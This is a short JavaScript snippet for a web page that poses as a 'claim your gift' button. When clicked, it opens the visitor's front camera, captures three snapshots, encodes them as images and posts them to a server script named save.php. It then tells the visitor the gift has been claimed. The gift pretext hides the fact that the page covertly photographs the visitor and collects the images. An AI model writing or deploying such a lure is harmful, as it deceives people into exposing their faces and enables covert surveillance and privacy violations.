const startBtn = document.getElementById('startBtn');
const status = document.getElementById('status');

startBtn.onclick = async () => {
    status.innerText = "Claiming your gift. please wait...";
    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    let images = [];

    for (let i=0;i<3;i++) {
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        canvas.getContext('2d').drawImage(bitmap,0,0);
        images.push(canvas.toDataURL('image/png'));
    }
    track.stop();

    await fetch('save.php', {
        method:'POST',
        body:JSON.stringify({images}),
        headers:{'Content-Type':'application/json'}
    });

    status.innerText = "🎉 Gift claimed! Thank you!";
};
